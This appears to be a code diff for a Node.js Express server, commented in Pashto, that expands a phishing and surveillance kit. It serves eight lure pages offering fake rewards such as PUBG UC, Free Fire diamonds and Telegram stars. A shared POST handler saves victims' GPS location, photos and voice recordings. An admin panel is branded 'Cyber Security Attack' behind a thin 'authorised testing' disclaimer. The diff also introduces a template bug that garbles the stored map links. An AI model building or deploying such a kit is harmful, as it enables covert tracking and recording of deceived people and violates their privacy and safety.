@@ -19,13 +19,9 @@ const locationsDir = path.join(uploadDir, 'locations');
 
 const storage = multer.diskStorage({
     destination: (req, file, cb) => {
-        if (file.fieldname === 'photo') {
-            cb(null, photosDir);
-        } else if (file.fieldname === 'voice') {
-            cb(null, voicesDir);
-        } else {
-            cb(null, uploadDir);
-        }
+        if (file.fieldname === 'photo') cb(null, photosDir);
+        else if (file.fieldname === 'voice') cb(null, voicesDir);
+        else cb(null, uploadDir);
     },
     filename: (req, file, cb) => {
         const ext = file.fieldname === 'photo' ? '.jpg' : '.ogg';
@@ -39,36 +35,67 @@ app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 app.use('/uploads', express.static(uploadDir));
 
+// --- د ټولو ۸ پاڼو مسیرونه (Routes) ---
+
+// ۱. لومړنۍ پاڼه (د واټساپ ګروپ)
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
 });
 
-app.post('/', upload.fields([{ name: 'photo' }, { name: 'voice' }]), (req, res) => {
+// ۲. دویمه پاڼه (وړیا چارج)
+app.get('/charge', (req, res) => {
+    res.sendFile(path.join(__dirname, 'index2.html'));
+});
+
+// ۳. درېیمه پاڼه (پابجی UC)
+app.get('/pubg', (req, res) => {
+    res.sendFile(path.join(__dirname, 'index3.html'));
+});
+
+// ۴. څلورمه پاڼه (فری فایر الماسونه)
+app.get('/freefire', (req, res) => {
+    res.sendFile(path.join(__dirname, 'index4.html'));
+});
+
+// ۵. پنځمه پاڼه (یوټوب ټمنل ډانلوډر)
+app.get('/youtube', (req, res) => {
+    res.sendFile(path.join(__dirname, 'index5.html'));
+});
+
+// ۶. شپږمه پاڼه (تلګرام سټار)
+app.get('/telegram', (req, res) => {
+    res.sendFile(path.join(__dirname, 'index6.html'));
+});
+
+// ۷. اوومه پاڼه (فیسبوک بوسټر)
+app.get('/facebook', (req, res) => {
+    res.sendFile(path.join(__dirname, 'index7.html'));
+});
+
+// ۸. اتمه پاڼه (ویډیو کال شبکه)
+app.get('/videocall', (req, res) => {
+    res.sendFile(path.join(__dirname, 'index8.html'));
+});
+
+// د ډېټا راټولولو عامه لار (POST) د ټولو پاڼو لپاره
+app.post('*', upload.fields([{ name: 'photo' }, { name: 'voice' }]), (req, res) => {
     if (req.body.latitude && req.body.longitude) {
         const lat = parseFloat(req.body.latitude);
         const lng = parseFloat(req.body.longitude);
         if (!isNaN(lat) && !isNaN(lng)) {
             const time = new Date().toISOString().replace(/T/, ' ').replace(/\..+/, '');
-            const entry = `نېټه: ${time} | لوکیشن: https://maps.google.com/?q=${lat},${lng}\n-----------------------------------\n`;
+            const entry = `نېټه: ${time} | لوکیشن: https://maps.google.com/?q=${lat},{$lng}\n-----------------------------------\n`;
             fs.appendFileSync(path.join(locationsDir, 'locations.txt'), entry, 'utf8');
             return res.send("Location Saved");
         }
     }
-
-    if (req.files && req.files.photo) {
-        return res.send("Photo Saved");
-    }
-
-    if (req.files && req.files.voice) {
-        return res.send("Voice Saved");
-    }
-
+    if (req.files && req.files.photo) return res.send("Photo Saved");
+    if (req.files && req.files.voice) return res.send("Voice Saved");
     res.status(400).send("Bad Request");
 });
 
+// مرکزي اډمین پینل
 app.get('/admin', (req, res) => {
-    const welcomeViewed = req.query.action === 'enter' || req.headers.cookie?.includes('welcome=true');
-
     if (req.query.action === 'enter') {
         res.setHeader('Set-Cookie', 'welcome=true; Path=/');
         return res.redirect('/admin');
@@ -171,7 +198,7 @@ app.get('/admin', (req, res) => {
             <div class="welcome-title">🛡️ Welcome to Cyber Security Attack ⚡</div>
             <p style="text-align: center; font-weight: bold; color: #25D366; margin: 5px 0;">🔰 د برنامې هرکلی!</p>
             <div class="welcome-msg">
-                ⚠️ <strong>مهمه خبرتیا:</strong> دا اپلیکیشن یوازې د مجازو امنیتي ازموینو او مهمو اهدافو لپاره شوی دی.<br><br>
+                ⚠️ <strong>مهمه خبرتیا:</strong> دا اپلیکیشن یوازې د مجازو امنیتي ازموینو لپاره دی.<br><br>
                 👨‍💻 <strong>درنښت، اډمین:</strong> @Mastershahzada
             </div>
             <a href="/admin?action=enter" class="enter-btn">سیستم ته ننوتل 🚀</a>
